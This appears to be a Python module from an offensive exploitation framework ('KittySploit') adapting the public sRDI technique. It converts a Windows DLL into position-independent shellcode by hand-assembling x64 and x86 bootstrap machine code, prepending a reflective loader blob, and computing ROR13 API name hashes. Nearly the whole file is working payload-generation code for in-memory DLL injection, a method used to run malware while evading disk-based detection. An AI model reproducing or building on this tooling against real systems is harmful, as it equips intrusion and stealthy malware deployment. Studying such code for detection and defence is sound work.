#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""sRDI conversion helpers (monoxgas/sRDI, adapted for KittySploit)."""

from __future__ import annotations

import struct
from struct import pack

from lib.compile.srdi_blobs import RDI_SHELLCODE32, RDI_SHELLCODE64

MACHINE_IA64 = 512
MACHINE_AMD64 = 34404

ror = lambda val, r_bits, max_bits: (
    ((val & (2**max_bits - 1)) >> r_bits % max_bits)
    | (val << (max_bits - (r_bits % max_bits)) & (2**max_bits - 1))
)


def is64BitDLL(data: bytes) -> bool:
    header_offset = struct.unpack("<L", data[60:64])[0]
    machine = struct.unpack("<H", data[header_offset + 4 : header_offset + 6])[0]
    return machine in (MACHINE_IA64, MACHINE_AMD64)


def HashFunctionName(name: str, module: str | None = None) -> int:
    function = name.encode() + b"\x00"
    function_hash = 0

    if module:
        module_bytes = module.upper().encode("UTF-16LE") + b"\x00\x00"
        module_hash = 0
        for byte in module_bytes:
            module_hash = ror(module_hash, 13, 32)
            module_hash += byte
        for byte in function:
            function_hash = ror(function_hash, 13, 32)
            function_hash += byte
        function_hash += module_hash
        if function_hash > 0xFFFFFFFF:
            function_hash -= 0x100000000
    else:
        for byte in function:
            function_hash = ror(function_hash, 13, 32)
            function_hash += byte

    return function_hash


def ConvertToShellcode(
    dll_bytes: bytes,
    function_hash: int = 0x10,
    user_data: bytes = b"None",
    flags: int = 0,
) -> bytes:
    if is64BitDLL(dll_bytes):
        rdi_shellcode = RDI_SHELLCODE64
        bootstrap = b""
        bootstrap_size = 69

        bootstrap += b"\xe8\x00\x00\x00\x00"
        dll_offset = bootstrap_size - len(bootstrap) + len(rdi_shellcode)
        bootstrap += b"\x59"
        bootstrap += b"\x49\x89\xc8"
        bootstrap += b"\xba"
        bootstrap += pack("I", function_hash)
        bootstrap += b"\x49\x81\xc0"
        user_data_location = dll_offset + len(dll_bytes)
        bootstrap += pack("I", user_data_location)
        bootstrap += b"\x41\xb9"
        bootstrap += pack("I", len(user_data))
        bootstrap += b"\x56"
        bootstrap += b"\x48\x89\xe6"
        bootstrap += b"\x48\x83\xe4\xf0"
        bootstrap += b"\x48\x83\xec"
        bootstrap += b"\x30"
        bootstrap += b"\x48\x89\x4C\x24"
        bootstrap += b"\x28"
        bootstrap += b"\x48\x81\xc1"
        bootstrap += pack("I", dll_offset)
        bootstrap += b"\xC7\x44\x24"
        bootstrap += b"\x20"
        bootstrap += pack("I", flags)
        bootstrap += b"\xe8"
        bootstrap += pack("b", bootstrap_size - len(bootstrap) - 4)
        bootstrap += b"\x00\x00\x00"
        bootstrap += b"\x48\x89\xf4"
        bootstrap += b"\x5e"
        bootstrap += b"\xc3"

        if len(bootstrap) != bootstrap_size:
            raise ValueError(
                f"x64 bootstrap length: {len(bootstrap)} != bootstrapSize: {bootstrap_size}"
            )
        return bootstrap + rdi_shellcode + dll_bytes + user_data

    rdi_shellcode = RDI_SHELLCODE32
    bootstrap = b""
    bootstrap_size = 50

    bootstrap += b"\xe8\x00\x00\x00\x00"
    dll_offset = bootstrap_size - len(bootstrap) + len(rdi_shellcode)
    bootstrap += b"\x58"
    bootstrap += b"\x55"
    bootstrap += b"\x89\xe5"
    bootstrap += b"\x89\xc2"
    bootstrap += b"\x68"
    bootstrap += pack("I", flags)
    bootstrap += b"\x50"
    bootstrap += b"\x81\xc2"
    user_data_location = dll_offset + len(dll_bytes)
    bootstrap += pack("I", user_data_location)
    bootstrap += b"\x68"
    bootstrap += pack("I", len(user_data))
    bootstrap += b"\x52"
    bootstrap += b"\x68"
    bootstrap += pack("I", function_hash)
    bootstrap += b"\x05"
    bootstrap += pack("I", dll_offset)
    bootstrap += b"\x50"
    bootstrap += b"\xe8"
    bootstrap += pack("b", bootstrap_size - len(bootstrap) - 4)
    bootstrap += b"\x00\x00\x00"
    bootstrap += b"\x83\xc4\x14"
    bootstrap += b"\xc9"
    bootstrap += b"\xc3"

    if len(bootstrap) != bootstrap_size:
        raise ValueError(
            f"x86 bootstrap length: {len(bootstrap)} != bootstrapSize: {bootstrap_size}"
        )
    return bootstrap + rdi_shellcode + dll_bytes + user_data
